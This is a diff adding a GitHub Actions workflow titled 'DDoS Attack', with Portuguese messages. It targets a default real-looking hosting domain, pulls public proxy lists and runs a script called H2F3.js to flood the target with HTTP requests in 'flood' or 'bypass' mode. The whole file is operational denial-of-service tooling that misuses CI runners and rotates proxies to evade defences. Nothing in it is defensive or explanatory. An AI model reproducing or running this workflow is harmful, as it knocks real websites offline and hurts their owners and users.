@@ -1,0 +1,83 @@
+name: DDoS Attack
+
+on:
+  workflow_dispatch:
+    inputs:
+      target:
+        description: 'Target URL'
+        required: true
+        default: 'https://lordehost.com.br/'
+      time:
+        description: 'Time (seconds)'
+        required: true
+        default: '60'
+      rate:
+        description: 'Rate'
+        required: true
+        default: '10'
+      threads:
+        description: 'Threads'
+        required: true
+        default: '4'
+      method:
+        description: 'Method (GET/POST)'
+        required: true
+        default: 'GET'
+      mode:
+        description: 'Mode (flood/bypass)'
+        required: true
+        default: 'flood'
+
+jobs:
+  attack:
+    runs-on: ubuntu-latest
+    
+    steps:
+    - name: Checkout code
+      uses: actions/checkout@v3
+    
+    - name: Setup Node.js
+      uses: actions/setup-node@v3
+      with:
+        node-version: '18'
+    
+    - name: Install dependencies
+      run: |
+        npm install net http2 tls cluster os url crypto dns fs colors
+    
+    - name: Download and merge proxies
+      run: |
+        echo "Baixando proxies novos..."
+        curl -s https://api.proxyscrape.com/v3/free-proxy-list/get?request=displayproxies&protocol=http&format=text > proxies_novas.txt
+        curl -s https://raw.githubusercontent.com/TheSpeedX/SOCKS-List/master/http.txt >> proxies_novas.txt
+        curl -s https://raw.githubusercontent.com/monosans/proxy-list/main/proxies/http.txt >> proxies_novas.txt
+        
+        echo "Proxies baixados: $(wc -l proxies_novas.txt)"
+        
+        echo "Juntando com proxy.txt existente..."
+        if [ -f proxy.txt ]; then
+          cat proxy.txt >> proxies_novas.txt
+        fi
+        
+        cat proxies_novas.txt | sort -u > proxy.txt
+        rm proxies_novas.txt
+        
+        echo "Total de proxies: $(wc -l proxy.txt)"
+        echo "Primeiros 5 proxies:"
+        head -5 proxy.txt
+    
+    - name: Run H2F3.js
+      run: |
+        echo "Iniciando ataque em ${{ github.event.inputs.target }}"
+        echo "Tempo: ${{ github.event.inputs.time }}s"
+        echo "Rate: ${{ github.event.inputs.rate }}"
+        echo "Threads: ${{ github.event.inputs.threads }}"
+        echo "Método: ${{ github.event.inputs.method }}"
+        echo "Modo: ${{ github.event.inputs.mode }}"
+        echo "Proxies carregados: $(wc -l proxy.txt)"
+        node H2F3.js ${{ github.event.inputs.target }} ${{ github.event.inputs.time }} ${{ github.event.inputs.rate }} ${{ github.event.inputs.threads }} proxy.txt ${{ github.event.inputs.method }} ${{ github.event.inputs.mode }}
+    
+    - name: Show result
+      run: |
+        echo "Ataque finalizado!"
+        date
